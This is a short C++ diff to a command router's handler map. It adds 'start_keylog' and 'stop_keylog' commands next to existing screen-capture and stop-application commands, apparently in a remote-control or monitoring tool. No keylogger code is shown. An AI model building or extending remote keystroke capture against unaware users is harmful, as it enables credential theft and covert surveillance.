@@ -18,5 +18,9 @@ void Router::registerAllHandlers(std::unordered_map<std::string, Handler>& map) 
     map["stop_application"]  = ProcessHandlers::stopApp;
 
     map["capture_screen"]    = ProcessHandlers::captureScreen;
+
+    map["start_keylog"]      = ProcessHandlers::startKeylog;
+    map["stop_keylog"]       = ProcessHandlers::stopKeylog;
+    
     map["help"]              = ProcessHandlers::help;
 }
